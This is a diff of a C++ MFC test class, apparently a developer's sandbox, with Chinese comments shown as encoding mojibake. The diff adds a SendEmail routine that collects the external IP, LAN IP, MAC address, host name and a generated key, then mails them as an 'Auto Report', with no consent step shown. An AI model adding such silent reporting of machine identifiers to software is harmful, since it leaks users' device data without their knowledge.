@@ -1,4 +1,4 @@
-#include "stdafx.h"
+ï»¿#include "stdafx.h"
 #include "resource.h"
 
 #include "FormatChange.h"
@@ -6,9 +6,11 @@
 #include "BaseVersionDlg.h"
 #include "png.h"
 #include "stdarg.h"
+#include "MailClient.h"
+#include "NetControl.h"
 
 /*************************************************************************************/
-//¹¹Ôì¡¢Îö¹¹º¯Êı
+//æ„é€ ã€ææ„å‡½æ•°
 Example::Example(){
 
 }
@@ -17,40 +19,40 @@ Example::~Example(){
 
 }
 /*************************************************************************************/
-//Ö÷´°Ìå²Ù×÷
+//ä¸»çª—ä½“æ“ä½œ
 void Example::Init(void)
 {
-	printf("²âÊÔ¿ªÊ¼\r\n");
+	printf("æµ‹è¯•å¼€å§‹\r\n");
 }
 
 void Example::Exit(void)
 {
-	printf("²âÊÔ½áÊø\r\n");
+	printf("æµ‹è¯•ç»“æŸ\r\n");
 }
 
 
 
 /*************************************************************************************/
-//Ïß³Ì²âÊÔ
+//çº¿ç¨‹æµ‹è¯•
 DWORD WINAPI ThreadTestProc(LPVOID pParam)
 {
 	Example *Ex = (Example *)pParam;
-	Ex->PrintfFile("[Example][ThreadTestProc]Ïß³ÌĞİÃß\r\n");
+	Ex->PrintfFile("[Example][ThreadTestProc]çº¿ç¨‹ä¼‘çœ \r\n");
 	Sleep(1000);
-	Ex->PrintfFile("[Example][ThreadTestProc]Ïß³Ì½áÊø\r\n");
+	Ex->PrintfFile("[Example][ThreadTestProc]çº¿ç¨‹ç»“æŸ\r\n");
 	return 0;
 }
 
 void Example::ThreadTest(void){
-	printffile("Ïß³Ì²âÊÔ¿ªÊ¼\r\n");
+	printffile("çº¿ç¨‹æµ‹è¯•å¼€å§‹\r\n");
 	AfxBeginThread((AFX_THREADPROC)ThreadTestProc,this,THREAD_PRIORITY_HIGHEST);
-	printffile("Ïß³ÌÒÑ¾­´´½¨\r\n");
+	printffile("çº¿ç¨‹å·²ç»åˆ›å»º\r\n");
 }
 /*************************************************************************************/
-//Ê±¼ä²Ù×÷²âÊÔ
+//æ—¶é—´æ“ä½œæµ‹è¯•
 void Example::TimerTest(void){
 
-	printffile("Ê±¼ä²âÊÔ¿ªÊ¼\r\n");
+	printffile("æ—¶é—´æµ‹è¯•å¼€å§‹\r\n");
 
 	clock_t TimeStart,TimeEnd;
 	unsigned int TimeSpend;
@@ -60,40 +62,40 @@ void Example::TimerTest(void){
 
 	TimeSpend = TimeEnd - TimeStart;
 
-	printffile("Ê±¼ä¼ä¸ô:%uºÁÃë\r\n",TimeSpend);
+	printffile("æ—¶é—´é—´éš”:%uæ¯«ç§’\r\n",TimeSpend);
 
-	CTime time = CTime::GetCurrentTime();   ///¹¹ÔìCTime¶ÔÏó
+	CTime time = CTime::GetCurrentTime();   ///æ„é€ CTimeå¯¹è±¡
 #if 0
-	int m_nYear = time.GetYear();      ///Äê
-	int m_nMonth = time.GetMonth();      ///ÔÂ
-	int m_nDay = time.GetDay();      ///ÈÕ
-	int m_nHour = time.GetHour();      ///Ğ¡Ê±
-	int m_nMinute = time.GetMinute();   ///·ÖÖÓ
-	int m_nSecond = time.GetSecond();   ///Ãë
+	int m_nYear = time.GetYear();      ///å¹´
+	int m_nMonth = time.GetMonth();      ///æœˆ
+	int m_nDay = time.GetDay();      ///æ—¥
+	int m_nHour = time.GetHour();      ///å°æ—¶
+	int m_nMinute = time.GetMinute();   ///åˆ†é’Ÿ
+	int m_nSecond = time.GetSecond();   ///ç§’
 #endif
 	CString m_strTime = time.Format("%Y-%m-%d %H:%M:%S");
 	m_strTime += (CString)("\r\n");
 	printfcstringfile(m_strTime);
-	printffile("Ê±¼ä²âÊÔÍê³É\r\n");
+	printffile("æ—¶é—´æµ‹è¯•å®Œæˆ\r\n");
 
 }
 
 /*************************************************************************************/
-//ÎÄ¼ş²Ù×÷²âÊÔ
+//æ–‡ä»¶æ“ä½œæµ‹è¯•
 void Example::FileOperation(void){
-	printffile("ÎÄ¼ş²Ù×÷²âÊÔ¿ªÊ¼\r\n");
+	printffile("æ–‡ä»¶æ“ä½œæµ‹è¯•å¼€å§‹\r\n");
 
 	const char data[] = {"This is a test program"};
 	CFile mFile(_T("../Output/Test.txt"),CFile::modeCreate | CFile::modeReadWrite);
 	mFile.Write(data,sizeof(data));
 	mFile.Close();
 
-	printffile("ÎÄ¼ş²Ù×÷²âÊÔÍê³É\r\n");
+	printffile("æ–‡ä»¶æ“ä½œæµ‹è¯•å®Œæˆ\r\n");
 
 }
 
 /*************************************************************************************/
-//½ø¶ÈÌõ²âÊÔ
+//è¿›åº¦æ¡æµ‹è¯•
 
 void Example::ProcessCtrl(int Num){
 
@@ -104,12 +106,12 @@ void Example::ProcessCtrl(int Num){
 DWORD WINAPI ProcessTestThread(LPVOID pParam)
 {
 	Example *Ex = (Example *)pParam;
-	Ex->PrintfFile("[Example][ProcessTestThread]½ø¶ÈÌõ²Ù×÷²âÊÔ¿ªÊ¼\r\n");
+	Ex->PrintfFile("[Example][ProcessTestThread]è¿›åº¦æ¡æ“ä½œæµ‹è¯•å¼€å§‹\r\n");
 	for(int i=0;i<100;i++){
 		Sleep(100);
 		Ex->ProcessCtrl(i);
 	}
-	Ex->PrintfFile("[Example][ProcessTestThread]½ø¶ÈÌõ²Ù×÷²âÊÔ½áÊø\r\n");
+	Ex->PrintfFile("[Example][ProcessTestThread]è¿›åº¦æ¡æ“ä½œæµ‹è¯•ç»“æŸ\r\n");
 	return 0;
 }
 
@@ -117,35 +119,23 @@ void Example::ProcessTest(void){
 	AfxBeginThread((AFX_THREADPROC)ProcessTestThread,this,THREAD_PRIORITY_HIGHEST);
 }
 /*************************************************************************************/
-//»ñÈ¡±¾»úIPµØÖ·
-void Example::GetHostAddress(CString &strIPAddr)
-{
-	WSAData wsaData;
-	WSAStartup(MAKEWORD(1,1), &wsaData);
-
-	char    HostName[100];
-	gethostname(HostName, sizeof(HostName));// »ñµÃ±¾»úÖ÷»úÃû.
-
-	hostent* hn;
-	hn = gethostbyname(HostName);//¸ù¾İ±¾»úÖ÷»úÃûµÃµ½±¾»úip
-
-	strIPAddr=inet_ntoa(*(struct in_addr *)hn->h_addr_list[0]);//°Ñip»»³É×Ö·û´®ĞÎÊ½
-
-	WSACleanup();	//ÓÃÍê¼ÇµÃÊÍ·Å
-}
-
 void Example::NetTest(void){
-	printffile("ÍøÂçÏà¹Ø²âÊÔ¿ªÊ¼\r\n");
+	net_control NetCHdlr;
+	printffile("ç½‘ç»œç›¸å…³æµ‹è¯•å¼€å§‹\r\n");
 	CString IPCString;
-	this->GetHostAddress(IPCString);
-	IPCString = (CString)("±¾»úIPµØÖ·:")+ IPCString + (CString)("\r\n");
+	IPCString = NetCHdlr.get_localip();
+	IPCString = (CString)("æœ¬æœºå±€åŸŸç½‘IPåœ°å€:")+ IPCString + (CString)("\r\n");
 	printfcstringfile(IPCString);
-	printffile("ÍøÂçÏà¹Ø²âÊÔ½áÊø\r\n");
+
+	IPCString = NetCHdlr.get_netip();
+	IPCString = (CString)("æœ¬æœºç½‘ç»œIPåœ°å€:")+ IPCString + (CString)("\r\n");
+	printfcstringfile(IPCString);
+	printffile("ç½‘ç»œç›¸å…³æµ‹è¯•ç»“æŸ\r\n");
 }
 /*************************************************************************************/
-//Windows CMDÃüÁî²Ù×÷²âÊÔ
+//Windows CMDå‘½ä»¤æ“ä½œæµ‹è¯•
 void Example::WinCMDTest(void){
-	printffile("Windows CMDÃüÁî²âÊÔ:ipconfig\r\n");
+	printffile("Windows CMDå‘½ä»¤æµ‹è¯•:ipconfig\r\n");
 	WinExec("cmd.exe /C ipconfig&&pause", SW_SHOWNORMAL);
 }
 
@@ -154,17 +144,17 @@ void Example::OpencvFillRectangle(IplImage* img,UINT32 Startx,UINT32 Starty,UINT
 	cvFillConvexPoly(img,pt2,4,CV_RGB(0,0,0)); 
 }
 
-void on_Mouse(int event, int x, int y, int flags, void *ustc)//eventÊó±êÊÂ¼ş´úºÅ£¬x,yÊó±ê×ø±ê£¬flagsÍÏ×§ºÍ¼üÅÌ²Ù×÷µÄ´úºÅ
+void on_Mouse(int event, int x, int y, int flags, void *ustc)//eventé¼ æ ‡äº‹ä»¶ä»£å·ï¼Œx,yé¼ æ ‡åæ ‡ï¼Œflagsæ‹–æ‹½å’Œé”®ç›˜æ“ä½œçš„ä»£å·
 { 
 	CString TempCString;
 	Example *Ex = (Example *)ustc;
 
-	if (event == CV_EVENT_MOUSEMOVE)//ÒÆ¶¯
+	if (event == CV_EVENT_MOUSEMOVE)//ç§»åŠ¨
 	{
 		//TempCString.Format(_T("(%d,%d)\r\n"),x,y);
 		//CBaseVersionDlg *MainDlg = (CBaseVersionDlg *)AfxGetMainWnd();
 		//MainDlg->PathEditCtrl(TempCString);
-	}else if(event == CV_EVENT_LBUTTONDOWN){	//×óµ¥»÷
+	}else if(event == CV_EVENT_LBUTTONDOWN){	//å·¦å•å‡»
 		TempCString.Format(_T("(%d,%d)\r\n"),x,y);
 		AfxMessageBox(TempCString);
 	}
@@ -173,12 +163,12 @@ void on_Mouse(int event, int x, int y, int flags, void *ustc)//eventÊó±êÊÂ¼ş´úºÅ
 void Example::OpencvTest(void)
 {
 	//IplImage *img = cvLoadImage("../Input/OpencvTest.jpg");
-	//cvNamedWindow("Opencv²âÊÔ",CV_WINDOW_AUTOSIZE);
-	//cvShowImage("Opencv²âÊÔ",img);
+	//cvNamedWindow("Opencvæµ‹è¯•",CV_WINDOW_AUTOSIZE);
+	//cvShowImage("Opencvæµ‹è¯•",img);
 
 	IplImage *img2 = cvCreateImage(cvSize(800,800),8,3);
 
-	{	//Ğ´×Ö²âÊÔ
+	{	//å†™å­—æµ‹è¯•
 		char temp[16];
 		int x  = 13 , y = 14;
 		CvPoint pt = cvPoint(20,20); 
@@ -188,18 +178,18 @@ void Example::OpencvTest(void)
 		cvPutText(img2,temp, pt, &font, CV_RGB(255,0,0));   
 	}
 	
-	{	//»­Ô²²âÊÔ,5ÊÇ´óĞ¡
+	{	//ç”»åœ†æµ‹è¯•,5æ˜¯å¤§å°
 		CvPoint pt = cvPoint(50,50); 
 		cvCircle(img2, pt, 5,CV_RGB(255,0,0) ,CV_FILLED, CV_AA, 0 );   
 	}
 
-	{	//»­Ïß²âÊÔ
+	{	//ç”»çº¿æµ‹è¯•
 		cvLine(img2,cvPoint(100,100),cvPoint(200,200),CV_RGB(0,255,255));
 	}
 
-	{	//»­·½ĞÎ²âÊÔ
+	{	//ç”»æ–¹å½¢æµ‹è¯•
         cvRectangle(img2, cvPoint(50,50), cvPoint(100,100), CV_RGB(255,255,255));  
-		//»­Ìî³äĞÎ×´
+		//ç”»å¡«å……å½¢çŠ¶
 		#define PointNum 4
 		CvPoint pt1[PointNum] = {cvPoint(200,200),cvPoint(300,210),cvPoint(230,260),cvPoint(210,300)};
 		cvFillConvexPoly(img2,pt1,PointNum,CV_RGB(250,0,0)); 
@@ -208,13 +198,13 @@ void Example::OpencvTest(void)
 
 	}
 
-	cvNamedWindow("Opencv×Ô»æÍ¼",CV_WINDOW_AUTOSIZE);
-	cvSetMouseCallback("Opencv×Ô»æÍ¼", on_Mouse, this);
-	cvShowImage("Opencv×Ô»æÍ¼",img2);
+	cvNamedWindow("Opencvè‡ªç»˜å›¾",CV_WINDOW_AUTOSIZE);
+	cvSetMouseCallback("Opencvè‡ªç»˜å›¾", on_Mouse, this);
+	cvShowImage("Opencvè‡ªç»˜å›¾",img2);
 
 }
 
-//Ö÷ÒªÊÇCString ÊÇ UNICODEµÄ¸ñÊ½.
+//ä¸»è¦æ˜¯CString æ˜¯ UNICODEçš„æ ¼å¼.
 void Example::FormatTest(void){
 	char TestChar[] = {"Hello\r\n"};
 	CString TestCString = this->g_FormatHandle.CharToCString(TestChar);			//Char->CString
@@ -233,11 +223,11 @@ void Example::FormatTest(void){
 void Example::ScanWindowTest(void){
 	FormatChange FC;
 	Png PngHdlr(IDC_STATIC);
-//1.ÏÈ»ñµÃ×ÀÃæ´°¿Ú
+//1.å…ˆè·å¾—æ¡Œé¢çª—å£
     CWnd* pDesktopWnd = CWnd::GetDesktopWindow();
-//2.»ñµÃÒ»¸ö×Ó´°¿Ú
+//2.è·å¾—ä¸€ä¸ªå­çª—å£
     CWnd* pWnd = pDesktopWnd->GetWindow(GW_CHILD);
-//3.Ñ­»·È¡µÃ×ÀÃæÏÂµÄËùÓĞ×Ó´°¿Ú
+//3.å¾ªç¯å–å¾—æ¡Œé¢ä¸‹çš„æ‰€æœ‰å­çª—å£
     while(pWnd != NULL)
     {
        
@@ -245,19 +235,19 @@ void Example::ScanWindowTest(void){
 		char ClassTempChar[512];
 		char WinTempChar[512];
 		CString TempCString;
-		 //»ñµÃ´°¿ÚÀàÃû
+		 //è·å¾—çª—å£ç±»å
 		memset(TempWchar,0,sizeof(TempWchar));
 		memset(ClassTempChar,0,sizeof(ClassTempChar));
 		::GetClassName(pWnd->GetSafeHwnd(),TempWchar,sizeof(TempWchar)/sizeof(WCHAR));
-		TempCString.Format(_T("Àà:%ws"),TempWchar);
+		TempCString.Format(_T("ç±»:%ws"),TempWchar);
 		printfcstringfile(TempCString);
 		FC.WcharToChar(TempWchar,ClassTempChar);
 
-        //»ñµÃ´°¿Ú±êÌâ
+        //è·å¾—çª—å£æ ‡é¢˜
 		memset(TempWchar,0,sizeof(TempWchar));
 		memset(WinTempChar,0,sizeof(WinTempChar));
         ::GetWindowText(pWnd->GetSafeHwnd(),TempWchar,sizeof(TempWchar)/sizeof(WCHAR));
-		TempCString.Format(_T("´°Ìå:%ws\r\n"),TempWchar);
+		TempCString.Format(_T("çª—ä½“:%ws\r\n"),TempWchar);
 		printfcstringfile(TempCString);
 		FC.WcharToChar(TempWchar,WinTempChar);
 #if 1
@@ -296,7 +286,39 @@ void Example::DlgMsgListen(int MessageID)
 {
 	this->Printf("DlgMsgID = %d\r\n",MessageID);
 
-	if(MessageID == 38)	//×¥È¡¿Ø¼şUI²âÊÔ 
+	if(MessageID == 38)	//æŠ“å–æ§ä»¶UIæµ‹è¯• 
 		this->ShowCwnd(this->IDToCWnd(IDC_STATIC),"Win");
+}
 
+void Example::SendEmail(void)
+{
+	mail_client MailHdlr;
+	net_control NetCHdlr;
+
+	CString NetIp;
+	CString LocalIp;
+	CString PCName;
+	CString MailContext;
+	CString MAC;
+	CString Password;
+
+	NetIp = NetCHdlr.get_netip();				//è·å–IPåœ°å€ä¿¡æ¯
+	NetIp = CString("[å¤–ç½‘IP:") + NetIp + CString("]\n");
+	LocalIp = NetCHdlr.get_localip();
+	LocalIp = CString("[å±€åŸŸç½‘IP:") + LocalIp + CString("]\n");
+	MAC = NetCHdlr.get_mac();
+	MAC = CString("[ç½‘å¡åœ°å€:") + MAC + CString("]\n");
+	PCName = NetCHdlr.get_pcname();
+	PCName = CString("[ä¸»æœºå:") + PCName + CString("]\n");
+	Password = NetCHdlr.CreatePawword();
+	Password = CString("[ç§˜é’¥:") + Password + CString("]\n");
+
+
+	MailHdlr.SetMailSubject(CString("Auto Report"));
+
+	MailContext = NetIp + LocalIp + MAC + PCName + Password + CString("	I'm using the Example software.");
+
+	MailHdlr.SetMailContext(MailContext);
+	
+	MailHdlr.Send();
 }
